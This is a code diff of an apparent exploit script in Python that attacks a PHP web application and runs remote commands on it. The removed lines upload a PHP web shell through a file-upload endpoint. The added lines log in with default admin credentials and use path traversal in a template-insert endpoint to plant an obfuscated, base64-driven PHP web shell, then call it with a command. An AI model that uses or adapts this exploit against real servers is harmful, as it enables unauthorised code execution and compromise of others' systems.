@@ -34,34 +34,18 @@ def vulnerable_attack(target,target_port,cmd):
 def shit(target,target_port,cmd):
     s = requests.Session()
     ip = target
-    url_1 = 'http://%s:%s/index.php/user/upFiles/upload' % (ip,str(target_port))
-    
-    my_hash = hashlib.md5(str(randint(1,10000000))).hexdigest()[:8]
-    shell = "<?php system($_GET['%s']);?>" % my_hash
-    open('/tmp/a.php','w').write(shell)
-
-    files = {'file':open('/tmp/a.php','r')}
     headers = {"X-Requested-With": "XMLHttpRequest"}
-    print url_1
-    content = s.post(url_1,files=files,headers=headers).content
-    import json
-    
-    try:
-        path = '/public' + json.loads(content)['url']
-    except:
-        return 'error'
-
-       
-    url_2 = 'http://%s:%s/' % (ip,str(target_port))
-    url_2 += path
-
-    print url_2
-
-    final_url = url_2 + '?' + my_hash + '=' + quote(cmd)
-    print final_url
-    res = s.get(final_url).content
+    url_1 = 'http://%s:%s/index.php/admin/login/index.html' % (ip,str(target_port))
+    print s.post(url_1,data={"username":"admin","password":"admin123","captcha":"a"},headers=headers).content
+    url_2 = 'http://%s:%s/index.php/admin/Template/insert' % (ip,str(target_port))
+    import base64
+    payload = base64.b64encode(cmd)
+    data = {"file":"../../../../runtime/temp/.haozi","type":"php","content":"<?php call_user_func('sy'.'stem',call_user_func('bas'.'e64_dec'.'ode',$_GET[a]));?>" }
+    res =  s.post(url_2,data=data,headers=headers).content
 
     print res
-
-
+    url_3 = 'http://%s:%s/runtime/temp/.haozi.php?a='%(ip,str(target_port))
+    url_3 += payload 
+    res = s.get(url_3).content
+    print res
     return res
